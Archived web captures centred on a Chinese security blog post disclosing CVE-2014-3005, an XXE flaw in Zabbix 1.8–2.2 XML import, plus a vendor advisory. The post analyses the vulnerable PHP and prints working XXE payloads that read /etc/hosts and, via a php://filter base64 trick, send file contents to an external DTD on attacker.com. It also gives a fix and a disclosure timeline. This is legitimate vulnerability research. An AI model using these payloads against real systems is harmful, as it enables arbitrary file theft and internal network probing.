* [白小黑](https://web.archive.org/web/20140622034155/http%3A//www.baixiaohei.com/)发表在《[About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7#comment-538)》
* pnig0s|小P发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-484)》
* livers发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-482)》

[自豪地采用WordPress](https://web.archive.org/web/20140622034155/http%3A//cn.wordpress.org/ "优雅的个人发布平台")



=== Content from web.archive.org_47b3f67b_20250126_110443.html ===


[Ask the publishers](https://change.org/LetReadersRead) to restore access to 500,000+ books.

Hamburger icon
An icon used to represent a menu that can be toggled by interacting with this icon.

[Internet Archive logo
A line drawing of the Internet Archive headquarters building faÃ§ade.](https://archive.org/ "Go home")

[Web icon
An illustration of a computer application window

Wayback Machine](https://web.archive.org "Expand web menu")

[Texts icon
An illustration of an open book.

Texts](https://archive.org/details/texts "Expand texts menu")

[Video icon
An illustration of two cells of a film strip.

Video](https://archive.org/details/movies "Expand video menu")

[Audio icon
An illustration of an audio speaker.

Audio](https://archive.org/details/audio "Expand audio menu")

[Software icon
An illustration of a 3.5" floppy disk.

Software](https://archive.org/details/software "Expand software menu")

[Images icon
An illustration of two photographs.

Images](https://archive.org/details/image "Expand images menu")

[Donate icon
An illustration of a heart shape

Donate](https://archive.org/donate/ "Expand donate menu")

[Ellipses icon
An illustration of text ellipses.

More](https://archive.org/about/ "Expand more menu")

[Donate icon
An illustration of a heart shape

"Donate to the archive"](https://archive.org/donate/?origin=iawww-mbhrt)

User icon
An illustration of a person's head and chest.
[Sign up](https://archive.org/account/signup)
|
[Log in](https://archive.org/account/login)

[Upload icon
An illustration of a horizontal line over an up pointing arrow.

Upload](https://archive.org/create)

Search icon
An illustration of a magnifying glass.

Search icon
An illustration of a magnifying glass.

### Internet Archive Audio

[![](https://archive.org/services/img/etree)Live Music Archive](https://archive.org/details/etree)

[![](https://archive.org/services/img/librivoxaudio)Librivox Free Audio](https://archive.org/details/librivoxaudio)

#### Featured

* [All Audio](https://archive.org/details/audio)
* [Grateful Dead](https://archive.org/details/GratefulDead)
* [Netlabels](https://archive.org/details/netlabels)
* [Old Time Radio](https://archive.org/details/oldtimeradio)
* [78 RPMs and Cylinder Recordings](https://archive.org/details/78rpm)

#### Top

* [Audio Books & Poetry](https://archive.org/details/audio_bookspoetry)
* [Computers, Technology and Science](https://archive.org/details/audio_tech)
* [Music, Arts & Culture](https://archive.org/details/audio_music)
* [News & Public Affairs](https://archive.org/details/audio_news)
* [Spirituality & Religion](https://archive.org/details/audio_religion)
* [Podcasts](https://archive.org/details/podcasts)
* [Radio News Archive](https://archive.org/details/radio)

### Images

[![](https://archive.org/services/img/metropolitanmuseumofart-gallery)Metropolitan Museum](https://archive.org/details/metropolitanmuseumofart-gallery)

[![](https://archive.org/services/img/clevelandart)Cleveland Museum of Art](https://archive.org/details/clevelandart)

#### Featured

* [All Images](https://archive.org/details/image)
* [Flickr Commons](https://archive.org/details/flickrcommons)
* [Occupy Wall Street Flickr](https://archive.org/details/flickr-ows)
* [Cover Art](https://archive.org/details/coverartarchive)
* [USGS Maps](https://archive.org/details/maps_usgs)

#### Top

* [NASA Images](https://archive.org/details/nasa)
* [Solar System Collection](https://archive.org/details/solarsystemcollection)
* [Ames Research Center](https://archive.org/details/amesresearchcenterimagelibrary)

### Software

[![](https://archive.org/services/img/internetarcade)Internet Arcade](https://archive.org/details/internetarcade)

[![](https://archive.org/services/img/consolelivingroom)Console Living Room](https://archive.org/details/consolelivingroom)

#### Featured

* [All Software](https://archive.org/details/software)
* [Old School Emulation](https://archive.org/details/tosec)
* [MS-DOS Games](https://archive.org/details/softwarelibrary_msdos_games)
* [Historical Software](https://archive.org/details/historicalsoftware)
* [Classic PC Games](https://archive.org/details/classicpcgames)
* [Software Library](https://archive.org/details/softwarelibrary)

#### Top

* [Kodi Archive and Support File](https://archive.org/details/kodi_archive)
* [Vintage Software](https://archive.org/details/vintagesoftware)
* [APK](https://archive.org/details/apkarchive)
* [MS-DOS](https://archive.org/details/softwarelibrary_msdos)
* [CD-ROM Software](https://archive.org/details/cd-roms)
* [CD-ROM Software Library](https://archive.org/details/cdromsoftware)
* [Software Sites](https://archive.org/details/softwaresites)
* [Tucows Software Library](https://archive.org/details/tucows)
* [Shareware CD-ROMs](https://archive.org/details/cdbbsarchive)
* [Software Capsules Compilation](https://archive.org/details/softwarecapsules)
* [CD-ROM Images](https://archive.org/details/cdromimages)
* [ZX Spectrum](https://archive.org/details/softwarelibrary_zx_spectrum)
* [DOOM Level CD](https://archive.org/details/doom-cds)

### Texts

[![](https://archive.org/images/widgetOL.png)Open Library](https://openlibrary.org/)

[![](https://archive.org/services/img/americana)American Libraries](https://archive.org/details/americana)

#### Featured

* [All Texts](https://archive.org/details/texts)
* [Smithsonian Libraries](https://archive.org/details/smithsonian)
* [FEDLINK (US)](https://archive.org/details/fedlink)
* [Genealogy](https://archive.org/details/genealogy)
* [Lincoln Collection](https://archive.org/details/lincolncollection)

#### Top

* [American Libraries](https://archive.org/details/americana)
* [Canadian Libraries](https://archive.org/details/toronto)
* [Universal Library](https://archive.org/details/universallibrary)
* [Project Gutenberg](https://archive.org/details/gutenberg)
* [Children's Library](https://archive.org/details/iacl)
* [Biodiversity Heritage Library](https://archive.org/details/biodiversity)
* [Books by Language](https://archive.org/details/booksbylanguage)
* [Additional Collections](https://archive.org/details/additional_collections)

### Video

[![](https://archive.org/services/img/tv)TV News](https://archive.org/details/tv)

[![](https://archive.org/services/img/911)Understanding 9/11](https://archive.org/details/911)

#### Featured

* [All Video](https://archive.org/details/movies)
* [Prelinger Archives](https://archive.org/details/prelinger)
* [Democracy Now!](https://archive.org/details/democracy_now_vid)
* [Occupy Wall Street](https://archive.org/details/occupywallstreet)
* [TV NSA Clip Library](https://archive.org/details/nsa)

#### Top

* [Animation & Cartoons](https://archive.org/details/animationandcartoons)
* [Arts & Music](https://archive.org/details/artsandmusicvideos)
* [Computers & Technology](https://archive.org/details/computersandtechvideos)
* [Cultural & Academic Films](https://archive.org/details/culturalandacademicfilms)
* [Ephemeral Films](https://archive.org/details/ephemera)
* [Movies](https://archive.org/details/moviesandfilms)
* [News & Public Affairs](https://archive.org/details/newsandpublicaffairs)
* [Spirituality & Religion](https://archive.org/details/spiritualityandreligion)
* [Sports Videos](https://archive.org/details/sports)
* [Television](https://archive.org/details/television)
* [Videogame Videos](https://archive.org/details/gamevideos)
* [Vlogs](https://archive.org/details/vlogs)
* [Youth Media](https://archive.org/details/youth_media)

Search the history of over 916 billion
[web pages](https://blog.archive.org/2016/10/23/defining-web-pages-web-sites-and-web-captures/)
on the Internet.

Search the Wayback Machine

Search icon
An illustration of a magnifying glass.

#### Mobile Apps

* [Wayback Machine (iOS)](https://apps.apple.com/us/app/wayback-machine/id1201888313)
* [Wayback Machine (Android)](https://play.google.com/store/apps/details?id=com.archive.waybackmachine&hl=en_US)

#### Browser Extensions

* [Chrome](https://chrome.google.com/webstore/detail/wayback-machine/fpnmgdkabkmnadcjpehmlllkndpkmiak)
* [Firefox](https://addons.mozilla.org/en-US/firefox/addon/wayback-machine_new/)
* [Safari](https://apps.apple.com/us/app/wayback-machine/id1472432422?mt=12)
* [Edge](https://microsoftedge.microsoft.com/addons/detail/wayback-machine/kjmickeoogghaimmomagaghnogelpcpn?hl=en-US)

#### Archive-It Subscription

* [Explore the Collections](https://www.archive-it.org/explore)
* [Learn More](https://www.archive-it.org/blog/learn-more/)
* [Build Collections](https://www.archive-it.org/contact-us)

### Save Page Now

Capture a web page as it appears now for use as a trusted citation in the future.

Please enter a valid web address

* [About](https://archive.org/about/)
* [Blog](https://blog.archive.org)
* [Projects](https://archive.org/projects/)
* [Help](https://archive.org/about/faqs.php)
* [Donate](https://archive.org/donate?origin=iawww-TopNavDonateButton)
* [Contact](https://archive.org/about/contact)
* [Jobs](https://archive.org/about/jobs)
* [Volunteer](https://archive.org/about/volunteer-positions)
* [People](https://archive.org/about/bios)

* [Sign up for free](https://archive.org/account/signup)
* [Log in](https://archive.org/account/login)

Search metadata

Search text contents

Search TV news captions

Search radio transcripts

Search archived web sites

[Advanced Search](https://archive.org/advancedsearch.php)

* [About](https://archive.org/about/)
* [Blog](https://blog.archive.org)
* [Projects](https://archive.org/projects/)
* [Help](https://archive.org/about/faqs.php)
* [Donate
  Donate icon
  An illustration of a heart shape](https://archive.org/donate?origin=iawww-TopNavDonateButton)
* [Contact](https://archive.org/about/contact)
* [Jobs](https://archive.org/about/jobs)
* [Volunteer](https://archive.org/about/volunteer-positions)
* [People](https://archive.org/about/bios)

The Wayback Machine requires your browser to support JavaScript, please email info@archive.org
if you have any questions about this.

The Wayback Machine is an initiative of the
[Internet Archive](//archive.org/),
a 501(c)(3) non-profit, building a digital library of
Internet sites and other cultural artifacts in digital form.

Other [projects](//archive.org/projects/) include
[Open Library](https://openlibrary.org/) &
[archive-it.org](https://archive-it.org).

Your use of the Wayback Machine is subject to the Internet Archive's
[Terms of Use](//archive.org/about/terms.php).



=== Content from web.archive.org_eb318382_20250126_110509.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[11 captures](/web/20140622034155%2A/http%3A//www.pnigos.com/?p=273 "See a list of every capture for this URL")
22 Jun 2014 - 18 Jul 2024

| May | JUN | [**Sep**](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "17 Sep 2014") |
| Previous capture | 22 | [Next capture](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "00:46:52 Sep 17, 2014") |
| 2013 | 2014 | [**2015**](https://web.archive.org/web/20150820194335/http%3A//www.pnigos.com/?p=273 "20 Aug 2015") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140622034155/http://www.pnigos.com:80/?p=273

# [风井](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/ "风井")

## Know me then ignore me

### 菜单

[跳至内容](#content "跳至内容")

* [首页](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/)
* [About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7)
* [Papers](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=2)
* [FreeBuf](https://web.archive.org/web/20140622034155/http%3A//www.freebuf.com/)
* [VulBox](https://web.archive.org/web/20140622034155/https%3A//vulbox.com/)

# [CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack

[1条回复](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comments "《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上的评论")

**0×01，背景：**

zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。

**0×02，漏洞说明：**

zabbix提供灵活的针对各项配置的导入/导出机制，支持XML的数据格式。后端在对导入的xml数据进行处理时，解析了外部实体，导致攻击者可以构造恶意的xml文件，读取zabbix服务器本地文件内容或以服务器为代理发起网络请求，扫描端口，探测内网。

**影响版本：**1.8.x-2.2（当前最新版）

**Found by：**pnig0s

**0×03，漏洞分析：**

问题代码存在于include/classes/import/CXmlImport18.php，395行：

```
public static function import($file) {
libxml_use_internal_errors(true);

$xml = new DOMDocument();
if (!$xml->loadXML($file)) {
    $text = '';
    foreach (libxml_get_errors() as $error) {
        switch ($error->level) {
            case LIBXML_ERR_WARNING:
                $text .= _('XML file contains errors').'. Warning '.$error->code.': ';
                break;
            case LIBXML_ERR_ERROR:
                $text .= _('XML file contains errors').'. Error '.$error->code.': ';
                break;
            case LIBXML_ERR_FATAL:
                $text .= _('XML file contains errors').'. Fatal Error '.$error->code.': ';
                break;
        }

        $text .= trim($error->message).' [ Line: '.$error->line.' | Column: '.$error->column.' ]';
        break;
    }
    libxml_clear_errors();

    throw new Exception($text);
}
```

代码首先初始化了DOMDocument对象，然后调用loadXML函数对导入的XML文件进行解析。DOMDocument，SimpleXML和XMLReader是PHP中三种最常用的处理XML的方式，这三种方式默认都支持对外部实体的解析，而这段代码中也没有明确禁止对外部实体的解析。

我们创建一个符合zabbix要求的xml文件，并在起始处声明外部实体。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "file:///etc/hosts">
]>
<zabbix_export>&file;</zabbix_export>
```

进入Configuration->Hosts->Import，并导入，发现回显报错，但不是预期的文件内容。

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/6631398426709.PNG "directly_error.PNG")

跟到报错信息所指的文件中，include/classes/import/CXmlImport18.php，第425行

```
if ($xml->childNodes->item(0)->nodeName != 'zabbix_export') {
    $xml2 = self::createDOMDocument();
    $xml2->appendChild($xml2->ownerDocument->importNode($xml->childNodes->item(0), true));
    self::$xml = $xml2->ownerDocument;
}
else {
    self::$xml = $xml;
}
```

代码判断了子节点的第一个结点是否为zabbix\_export，若不是则创建一个新的xml DOM文档并将之前的第一个结点复制到新的DOM文档中使用。而我们构造的xml文件的第一个结点是<!DOCTYPE xxx []>，文档类型的声明不符合一般结点的规范，因此在导入时报错。逻辑中断在这里不会继续执行，无法达到我们的目的。而文档类型的声明又必须紧邻xml头的声明，我们也不能调整DOCTYPE声明的位置。

看似这个问题变得鸡肋了，不过可以使用一些tricks，曲线救国，达到我们的目的。

这里使用<!ENTITY % xxx “”>的参数实体形式在loadXML阶段主动构造出一个报错，把我们想要获取的信息爆出来同时可以发送到攻击者的服务器。参数实体不同与通用实体，仅能在实体声明内部使用。

首先在攻击者的服务器attacker.com中建立ext.dtd，内容为：

```
<!ENTITY % all
 "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>"
>
%all;
```

将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

将该文件导入，返回结果如下

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/77481398426709.PNG "redirect_plaintext_error.PNG")

很好很强大，爆出了服务器的hosts文件内容。但是这里还有一个小问题，有些文件过长或包含特殊的符号，会截断我们特意构造的参数实体声明，导致文件内容读取不完整。不过好在万能的php提供了php://filter/read=convert.base64-encode/resource这一wrapper，可以以base64的编码形式读取任意文件。

于是将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

查看远端Web访问日志：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/65091398426709.PNG "1.PNG")

解码base64：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/32991398426709.PNG "burp_decode_hosts.PNG")

**0×04，漏洞影响：**

1. 本地任意文件读取
2. 端口扫描
3. 内网探测

**0×05，修复建议：**

禁止对外部实体的解析。

**0×06，披露过程：**

04/24/2014 —— 发现漏洞

04/25/2014 —— 提交Zabbix官方（[https://support.zabbix.com/browse/ZBX-8151](https://web.archive.org/web/20140622034155/https%3A//support.zabbix.com/browse/ZBX-8151)）

04/27/2014 —— MITRE分配CVE-ID：CVE-2014-3005

06/17/2014 —— Fix Released

svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8

svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+

本条目发布于[2014 年 6 月 17 日](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273 "下午 10:57")。属于[代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]中的全部文章")、[漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]中的全部文章")分类，被贴了 [xxe attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe-attack)、[xxe漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe%e6%bc%8f%e6%b4%9e)、[zabbix漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=zabbix%e6%bc%8f%e6%b4%9e)、[外部实体攻击](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93%e6%94%bb%e5%87%bb) 标签。作者是[pnig0s|小P](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?author=1 "查看所有由pnig0s|小P发布的文章")。

### 文章导航

[← Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
[[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack →](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)

## 《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上有1条评论

1. Pingback引用通告： [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)

### 发表评论 [取消回复](/web/20140622034155/http%3A//www.pnigos.com/?p=273#respond)

电子邮件地址不会被公开。 必填项已用\*标注

姓名 \*

电子邮件 \*

站点

评论

您可以使用这些HTML标签和属性： `<a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <strike> <strong>`

### 近期文章

* [[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)
* [[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273)
* [Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
* [[CVE-2014-3242,3243]SOAPpy 0.12.5 Multiple Vulnerabilities](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=260)
* [Write-up:Digg.com stored xss](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=245)
### 分类目录

* [代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]下的所有文章") (4)
* [前端黑客[WebH4cking]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=4 "web hacking") (9)
* [唧唧歪歪[Gossip]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=5 "Gossip") (2)
* [机器学习[Make Love]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=88 "查看机器学习[Make Love]下的所有文章") (1)
* [渗透测试[Pentest]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=2 "H4cking") (2)
* [漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]下的所有文章") (9)
* [系统编程[SysCoding]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=3 "coding") (5)
### 文章归档

* [2014年六月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201406)
* [2014年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201405)
* [2014年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201404)
* [2014年三月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201403)
* [2014年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201402)
* [2013年十二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201312)
* [2013年十一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201311)
* [2013年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201305)
* [2013年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201304)
* [2013年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201302)
* [2013年一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201301)
### Dig Security

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec/wiki/Main)

[DOMXSS Wiki](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/domxsswiki/)

[SQLI Wiki](https://web.archive.org/web/20140622034155/http%3A//websec.ca/kb/sql_injection)

[Ruby Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/ruby-security/wiki/Guide)

[全球安全会议归档](https://web.archive.org/web/20140622034155/http%3A//archive.liquidmatrix.org/)

[渗透测试书签List](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/pentest-bookmarks/wiki/BookmarksList)

[HTML5Sec](https://web.archive.org/web/20140622034155/http%3A//html5sec.org/)

[Router Hacking](https://web.archive.org/web/20140622034155/http%3A//routerpwn.com/)

[Exploit Search](https://web.archive.org/web/20140622034155/http%3A//exploitsearch.net/)

[安全内容搜索](https://web.archive.org/web/20140622034155/http%3A//yehg.net/lab/pr0js/misc/wsa.php)

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec)

[XssVec Collection](https://web.archive.org/web/20140622034155/http%3A//84692bb0df6f30fc0687-25dde2f20b8e8c1bda75aeb96f737eae.r66.cf1.rackcdn.com/xss.html)

### Tool Box

[JS Beautifier](https://web.archive.org/web/20140622034155/http%3A//jsbeautifier.org/)

[Run JS](https://web.archive.org/web/20140622034155/http%3A//runjs.cn/)

[sitedossier](https://web.archive.org/web/20140622034155/http%3A//www.sitedossier.com/)

[Code encoder&encrypter](https://web.archive.org/web/20140622034155/http%3A//yehg.net/encoding/)

[XSS'OR](https://web.archive.org/web/20140622034155/http%3A//evilcos.me/lab/xssor/)

[ViewState Decoder](https://web.archive.org/web/20140622034155/http%3A//ignatu.co.uk/ViewStateDecoder.aspx)

### 近期评论

* [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)发表在《[[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comment-1857)》
* ttt发表在《[Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310#comment-829)》
* [白小黑](https://web.archive.org/web/20140622034155/http%3A//www.baixiaohei.com/)发表在《[About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7#comment-538)》
* pnig0s|小P发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-484)》
* livers发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-482)》

[自豪地采用WordPress](https://web.archive.org/web/20140622034155/http%3A//cn.wordpress.org/ "优雅的个人发布平台")



=== Content from web.archive.org_a2ff87ba_20250126_110507.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[2 captures](/web/20140707080006%2A/http%3A//www.gltc.cn/43012.html "See a list of every capture for this URL")
07 Jul 2014 - 10 Jul 2014

| Jun | JUL | Aug |
| Previous capture | 07 | [Next capture](https://web.archive.org/web/20140710045525/http%3A//www.gltc.cn%3A80/43012.html "04:55:25 Jul 10, 2014") |
| 2013 | 2014 | 2015 |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140707080006/http://www.gltc.cn:80/43012.html

[![国联天成](https://web.archive.org/web/20140707080006im_/http://gltccn.gotoip4.com/wp-content/themes/colorway/images/logo.png)](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/)

[![safe2](https://web.archive.org/web/20140707080006im_/http://gltccn.gotoip4.com/wp-content/uploads/2013/10/safe2.jpg)](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/11188.html)

* [首页](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/)
* [专业安全服务](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/40226.html)
* [安全产品](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/aqcp)
* [渠道代理](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/qddl)
* [客户支持与培训](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/khzcypx)
* [合作伙伴](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/hzhb)
* [诚聘英才](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/cpyc)
* [关于我们](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/gywm)

[首页](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/) » [漏洞发布](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/ldfb "查看漏洞发布中的全部文章") » Zabbix XML外部实体注入漏洞(CVE-2014-3005)

| * [2014年七月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2014/07?cat=16 "2014年七月") * [2014年六月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2014/06?cat=16 "2014年六月") * [2014年五月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2014/05?cat=16 "2014年五月") * [2014年四月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2014/04?cat=16 "2014年四月") * [2014年三月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2014/03?cat=16 "2014年三月") * [2014年二月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2014/02?cat=16 "2014年二月") * [2014年一月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2014/01?cat=16 "2014年一月") * [2013年十二月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2013/12?cat=16 "2013年十二月") * [2013年十一月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2013/11?cat=16 "2013年十一月") * [2013年十月](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/date/2013/10?cat=16 "2013年十月") | * Zabbix XML外部实体注入漏洞(CVE-2014-3005)发表于：2014 年 6 月 20 日 [漏洞发布](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/ldfb "查看漏洞发布中的全部文章")  **发布日期：**2014-06-17  **受影响系统：** ZABBIX ZABBIX 1.8 – 2.2  **描述：**      ---      BUGTRAQ  ID: [68075](https://web.archive.org/web/20140707080006/http%3A//www.securityfocus.com/bid/68075)   CVE(CAN) ID: [CVE-2014-3005](https://web.archive.org/web/20140707080006/http%3A//www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3005)  ZABBIX是一个CS结构的分布式网络监控系统。  Zabbix 1.8 – 2.2版本include/classes/import/CXmlImport18.php存在XML外部实体注入漏洞，攻击者可利用此漏洞获取敏感信息。  <\*来源：pnig0s          链接：[http://www.pnigos.com/?p=273](https://web.archive.org/web/20140707080006/http%3A//www.pnigos.com/?p=273)   \*>  **建议：**      ---      厂商补丁：  ZABBIX   ——   目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：  www.zabbix.com/   svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+  **浏览次数：**154**严重程度：**0（网友投票）           [←上一篇](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/43011.html)     [下一篇 →](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/43013.html) |
| --- | --- |

﻿

[关于我们](https://web.archive.org/web/20140707080006/http%3A//www.gltc.cn/category/gywm)

